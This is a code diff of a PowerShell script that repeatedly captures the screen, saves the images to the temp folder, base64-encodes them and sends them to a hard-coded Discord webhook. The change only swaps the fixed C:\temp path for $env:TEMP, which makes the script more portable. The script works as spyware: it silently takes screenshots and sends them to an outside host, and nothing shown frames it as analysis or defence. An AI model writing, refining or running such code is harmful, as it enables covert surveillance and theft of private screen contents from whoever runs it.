@@ -4,7 +4,7 @@ $discordWebhook = "https://discord.com/api/webhooks/1250405440760713288/fl-mgc3v
 # Edit these variables as needed
 $numberOfScreenshots = 10
 $screenshotInterval = 5
-Set-Location -Path C:\temp
+Set-Location -Path $env:TEMP
 for ($i = 0; $i -lt $numberOfScreenshots; $i++) {
     Start-Sleep -Seconds $screenshotInterval
 
@@ -14,12 +14,12 @@ for ($i = 0; $i -lt $numberOfScreenshots; $i++) {
     $bitmap = New-Object System.Drawing.Bitmap $screenshot.Width, $screenshot.Height
     $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
     $graphics.CopyFromScreen($screenshot.Location, [System.Drawing.Point]::Empty, $screenshot.Size)
-    $bitmap.Save("C:\temp\screenshot$i.png")
+    $bitmap.Save("$env:TEMP\screenshot$i.png")
 
     # Send the screenshot via Discord webhook
     
     # Odczytaj zawartość pliku
-    $filename="C:\temp\screenshot$i.png"
+    $filename="$env:TEMP\screenshot$i.png"
     $fileContent = [System.IO.File]::ReadAllBytes($filename)
     $fileBase64 = [Convert]::ToBase64String($fileContent)
 
